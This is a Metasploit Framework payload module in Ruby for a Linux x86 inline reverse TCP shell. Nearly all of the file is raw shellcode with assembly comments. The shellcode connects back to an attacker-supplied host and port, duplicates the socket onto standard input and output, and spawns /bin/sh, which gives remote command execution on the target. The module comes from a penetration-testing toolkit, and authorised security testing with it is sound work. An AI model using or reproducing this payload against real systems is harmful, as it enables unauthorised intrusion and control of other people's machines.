##
# $Id$
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'msf/core/handler/reverse_tcp'
require 'msf/base/sessions/command_shell'
require 'msf/base/sessions/command_shell_options'

module Metasploit3

	include Msf::Payload::Single
	include Msf::Payload::Linux
	include Msf::Sessions::CommandShellOptions

	def initialize(info = {})
		super(merge_info(info,
			'Name'          => 'Linux Command Shell, Reverse TCP Inline',
			'Version'       => '$Revision$',
			'Description'   => 'Connect back to attacker and spawn a command shell',
			'Author'        => 'ramon',
			'License'       => MSF_LICENSE,
			'Platform'      => 'linux',
			'Arch'          => ARCH_X86,
			'Handler'       => Msf::Handler::ReverseTcp,
			'Session'       => Msf::Sessions::CommandShellUnix,
			'Payload'       =>
				{
					'Offsets' =>
						{
							'LHOST'    => [ 18, 'ADDR' ],
							'LPORT'    => [ 24, 'n'    ],
						},
					'Payload' =>
						"\x31\xdb"             +#   xorl    %ebx,%ebx                  #
						"\xf7\xe3"             +#   mull    %ebx                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x43"                 +#   incl    %ebx                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x6a\x02"             +#   pushl   $0x02                      #
						"\x89\xe1"             +#   movl    %esp,%ecx                  #
						"\xb0\x66"             +#   movb    $0x66,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x5b"                 +#   popl    %ebx                       #
						"\x5e"                 +#   popl    %esi                       #
						"\x68\x7f\x00\x00\x01" +#   pushl   $0x0100007f                #
						"\x66\x68\x04\xd2"     +#   pushw   $0xd204                    #
						"\x66\x53"             +#   pushw   %bx                        #
						"\x6a\x10"             +#   pushl   $0x10                      #
						"\x51"                 +#   pushl   %ecx                       #
						"\x50"                 +#   pushl   %eax                       #
						"\x89\xe1"             +#   movl    %esp,%ecx                  #
						"\x43"                 +#   incl    %ebx                       #
						"\x6a\x66"             +#   pushl   $0x66                      #
						"\x58"                 +#   popl    %eax                       #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x59"                 +#   popl    %ecx                       #
						"\x87\xd9"             +#   xchgl   %ebx,%ecx                  #
						"\xb0\x3f"             +#   movb    $0x3f,%al                  #
						"\xcd\x80"             +#   int     $0x80                      #
						"\x49"                 +#   decl    %ecx                       #
						"\x79\xf9"             +#   jns     <cntsockcode+43>           #
						"\x50"                 +#   pushl   %eax                       #
						"\x68\x2f\x2f\x73\x68" +#   pushl   $0x68732f2f                #
						"\x68\x2f\x62\x69\x6e" +#   pushl   $0x6e69622f                #
						"\x89\xe3"             +#   movl    %esp,%ebx                  #
						"\x50"                 +#   pushl   %eax                       #
						"\x53"                 +#   pushl   %ebx                       #
						"\x89\xe1"             +#   movl    %esp,%ecx                  #
						"\xb0\x0b"             +#   movb    $0x0b,%al                  #
						"\xcd\x80"              #   int     $0x80                      #
				}
			))
	end

end
